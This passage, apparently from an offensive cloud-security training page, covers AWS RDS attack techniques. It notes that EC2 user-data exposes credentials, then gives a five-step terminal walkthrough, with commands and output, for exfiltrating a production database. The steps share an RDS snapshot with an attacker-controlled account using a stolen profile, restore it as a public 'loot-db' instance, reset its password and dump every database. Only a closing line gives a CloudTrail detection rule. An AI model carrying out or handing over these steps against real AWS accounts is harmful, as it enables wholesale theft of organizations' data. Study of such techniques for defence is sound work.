PubliclyAccessible=True alone does not mean the database is reachable. The security group must also allow inbound traffic from the internet. Always verify both the RDS flag and the security group rules. Some instances are marked public but restricted by security group to specific IP ranges.

Credential Harvest
EC2 user-data is one of the most commonly overlooked credential exposure vectors. It is visible to anyone with ec2:DescribeInstanceAttribute and is stored in plaintext by AWS. Unlike Secrets Manager or SSM, user-data has no encryption, no rotation, and no access logging.

IAM database authentication tokens expire after 15 minutes but the connection stays alive until explicitly closed. RDS IAM auth requires the DB user to be created with CREATE USER iam_user IDENTIFIED WITH AWSAuthenticationPlugin AS 'RDS'; and the IAM policy to include rds-db:connect. The --enable-cleartext-plugin flag is required because the auth token is sent as a cleartext password over SSL.
Objective: Exfiltrate an entire production database by sharing an RDS snapshot to an attacker-controlled AWS account, restoring it, and dumping all data.
1
List all RDS snapshots in the account. Automated daily snapshots are prime targets — they contain full database copies.
Terminal
$ aws rds describe-db-snapshots --profile stolen \ --query 'DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier,SnapshotCreateTime,Status,Engine]' \ --output table
--------------------------------------------------------------------------------- | DescribeDBSnapshots | +---------------------------+-----------+-------------------------+-----------+-------+ | prod-daily-2024-03-16 | prod-db | 2024-03-16T03:00:00Z | available | mysql | | prod-daily-2024-03-15 | prod-db | 2024-03-15T03:00:00Z | available | mysql | | prod-daily-2024-03-14 | prod-db | 2024-03-14T03:00:00Z | available | mysql | | staging-snap-manual | stg-db | 2024-03-10T12:00:00Z | available | mysql | | pre-migration-backup | prod-db | 2024-02-28T18:30:00Z | available | mysql | +---------------------------+-----------+-------------------------+-----------+-------+
2
Share the most recent production snapshot with an attacker-controlled AWS account by modifying the snapshot's attribute.
Terminal
$ aws rds modify-db-snapshot-attribute \ --db-snapshot-identifier prod-daily-2024-03-16 \ --attribute-name restore \ --values-to-add 999888777666 \ --profile stolen
{ "DBSnapshotAttributesResult": { "DBSnapshotIdentifier": "prod-daily-2024-03-16", "DBSnapshotAttributes": [ { "AttributeName": "restore", "AttributeValues": [ "999888777666" ] } ] } }
# Verify the share
$ aws rds describe-db-snapshot-attributes \ --db-snapshot-identifier prod-daily-2024-03-16 --profile stolen
# Confirms account 999888777666 now has restore access
3
Switch to the attacker account and restore a new RDS instance from the shared snapshot. Make it publicly accessible for easy extraction.
Terminal
# In attacker account (999888777666)
$ aws rds restore-db-instance-from-db-snapshot \ --db-instance-identifier loot-db \ --db-snapshot-identifier arn:aws:rds:us-east-1:123456789012:snapshot:prod-daily-2024-03-16 \ --db-instance-class db.t3.micro \ --publicly-accessible \ --profile attacker
{ "DBInstance": { "DBInstanceIdentifier": "loot-db", "DBInstanceStatus": "creating", "Engine": "mysql", "DBInstanceClass": "db.t3.micro", "PubliclyAccessible": true } }
# Wait for the instance to become available (~10 minutes)
$ aws rds wait db-instance-available --db-instance-identifier loot-db --profile attacker
$ aws rds describe-db-instances --db-instance-identifier loot-db \ --profile attacker \ --query 'DBInstances[0].Endpoint.Address' --output text
loot-db.xyz789.us-east-1.rds.amazonaws.com
4
Reset the master password on the restored instance. Since you own this RDS instance, you have full control.
Terminal
$ aws rds modify-db-instance \ --db-instance-identifier loot-db \ --master-user-password 'NewPass123!Attacker' \ --apply-immediately \ --profile attacker
{ "DBInstance": { "DBInstanceIdentifier": "loot-db", "DBInstanceStatus": "modifying", "PendingModifiedValues": { "MasterUserPassword": "****" } } }
# Wait for the modification to apply
$ aws rds wait db-instance-available --db-instance-identifier loot-db --profile attacker
5
Connect to the restored instance and dump the entire database. You now have a full copy of the production data.
Terminal
$ mysqldump -h loot-db.xyz789.us-east-1.rds.amazonaws.com \ -u admin \ -p'NewPass123!Attacker' \ --all-databases > full_dump.sql

This is one of the most dangerous AWS data exfiltration techniques. The ModifyDBSnapshotAttribute API call generates a CloudTrail event, but many organizations do not monitor for snapshot sharing. Detection rule: alert on any ModifyDBSnapshotAttribute call where valuesToAdd contains an account ID outside the organization.
